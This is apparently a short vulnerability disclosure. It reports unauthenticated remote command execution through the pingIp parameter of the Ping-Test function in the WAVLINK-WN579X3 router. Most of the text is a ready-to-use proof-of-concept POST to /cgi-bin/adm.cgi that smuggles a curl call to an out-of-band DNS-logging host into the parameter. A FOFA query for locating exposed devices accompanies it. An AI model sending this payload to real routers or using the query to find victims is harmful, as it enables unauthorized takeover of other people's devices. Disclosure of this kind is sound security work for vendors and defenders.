A remote command execution vulnerability has been found in WAVLINK-WN579X3 

fofa:app="WAVLINK-WN579X3"

POC below:
```
POST /cgi-bin/adm.cgi HTTP/1.1
Host: ******
Content-Length: 83
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://122.213.241.75
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://122.213.241.75/ping.shtml?r=32723
Accept-Language: zh-CN,zh;q=0.9
Connection: close

page=ping_test&CCMD=4&pingIp=255.255.255.255%3Bcurl+http%3A%2F%2Fnhjt4ugt.dnslog.pw
```

The vulnerable function is the Ping-Test function, an attacker can execute arbitrary system command by malicious injection to parameter pingIp.


Reproduce:
![1](https://github.com/sleepyvv/vul_report/assets/55875284/dab7c21b-33cf-4832-9aec-80ea512774cf)


An unauthorized attacker can also exploit it without a cookie in http request header.
